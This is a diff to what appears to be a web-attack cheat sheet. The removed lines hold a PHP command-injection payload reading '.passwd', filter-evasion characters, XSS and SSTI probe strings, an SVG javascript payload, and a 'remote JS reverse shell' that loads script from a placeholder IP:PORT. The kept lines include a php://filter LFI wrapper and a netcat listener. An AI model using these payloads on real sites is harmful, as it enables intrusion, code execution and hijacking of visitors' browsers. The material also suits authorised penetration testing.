@@ -12,40 +12,8 @@ If file contains input *.php, than it is mb a LFI(Local File Inclusion).
 You can past filter for view php file (base64 format) on server
 <pre>php://filter/convert.base64-encode/resource=
 </pre>
-Some useful filter evasion characters
-<pre>%0a%0d => CRLF
-
-%00 => Nullbyte
-
-%E2%80%AE => RTL Character (writes payloads backwards)
-</pre>
 Content types headers
 <pre>Content-Type: image/jpeg
-</pre>
-Payloads examples
-<pre>?page=../.passwd','..') === true || system("cat .passwd") || strpos('includes/index
-</pre>
-Fairly short, and will give indicators of basic SQLi, XSS and SSTI vulnerabilities
-<pre>'"&gt;&lt;svg/onload=alert()>{{7*7}}
-</pre>
-XSS. Try it on URL query, fragment & path. All input fields.
-<pre>"&gt;&lt;img src onerror=alert(1)&gt;
-"autofocus onfocus=alert(1)//
-&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-'-alert(1)-'
-\'-alert(1)//
-javascript:alert(1)
-</pre>
-A remote JS reverse shell payload
-<pre>&lt;script&gt;setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)&lt;/script&gt;
-</pre>
-SVG-embedded payload
-<pre>&lt;?xml version="1.0" standalone="no"?&gt;
-&lt;svg viewBox="0 0 100 100" xmlns="https://t.co/ZF7xUkMN3m"&gt;
-&lt;a href="javascript&amp;#9;:alert(1)"&gt;
-&lt;circle cx="50" cy="40" r="35"/&gt;
-&lt;/a&gt;
-&lt;svg&gt;
 </pre>
 Reverse check request by nc
 <pre>nc -lvvp 1333
